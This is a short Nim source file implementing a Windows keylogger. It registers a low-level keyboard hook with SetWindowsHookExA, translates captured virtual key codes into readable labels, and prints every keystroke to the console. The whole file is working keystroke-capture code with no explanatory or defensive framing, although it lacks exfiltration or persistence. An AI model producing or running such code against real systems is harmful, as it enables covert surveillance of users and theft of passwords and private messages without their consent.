import winim

proc hook(code: int32, wParam: WPARAM, lParam: LPARAM): LRESULT =
    let info: ptr KBDLLHOOKSTRUCT = cast[ptr KBDLLHOOKSTRUCT](lParam)
    if code == HC_ACTION:
        if wParam == WM_KEYDOWN:
            let key = case info.vkCode:
                of 8: "[BACKSPACE]"
                of 13: "[ENTER]"
                of 32: " "
                of VK_TAB: "[TAB]"
                of VK_SHIFT: "[SHIFT]"
                of VK_CONTROL, 162, 163: "[CTRL]"
                of VK_ESCAPE: "[ESC]"
                of VK_END: "[END]"
                of VK_HOME: "[HOME]"
                of VK_LEFT: "[LEFT]"
                of VK_UP: "[UP]"
                of VK_RIGHT: "[RIGHT]"
                of VK_DOWN: "[DOWN]"
                of 190, 110: "."
                else: $chr(info.vkCode)
            #echo(info.vkCode)
            echo(key)
        
    result = CallNextHookEx(cast[HHOOK](NULL), code, wParam, lParam);
    

let hHook = SetWindowsHookExA(
    WH_KEYBOARD_LL,
    cast[HOOKPROC](hook),
    GetModuleHandle(NULL),
    cast[DWORD](NULL)
)

if hHook == 0:
    echo("[-] Failed to Setup Hook.")
    quit(-1)

var Msg: MSG

while GetMessage(&Msg, cast[HWND](NULL), 0, 0) > 0:
    try:
        TranslateMessage(&Msg)
        discard DispatchMessage(&Msg)
    except:
        quit(0)